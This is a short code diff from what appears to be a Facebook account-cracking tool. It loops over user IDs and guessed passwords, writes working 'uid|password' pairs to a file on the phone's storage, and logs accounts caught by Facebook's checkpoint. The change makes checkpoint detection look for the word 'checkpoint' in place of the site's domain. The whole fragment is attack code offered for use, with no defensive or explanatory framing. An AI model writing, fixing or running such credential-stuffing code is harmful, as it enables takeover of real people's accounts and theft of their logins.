@@ -1049,7 +1049,7 @@ def gxds_files(uid, pxss):
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
                 break
-            elif "www.facebook.com" in q:
+            elif "checkpoint" in q:
                 print(f"\r\r{lr}  [GXDS-CP] {uid}|{ps}")
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 cps.append(uid)
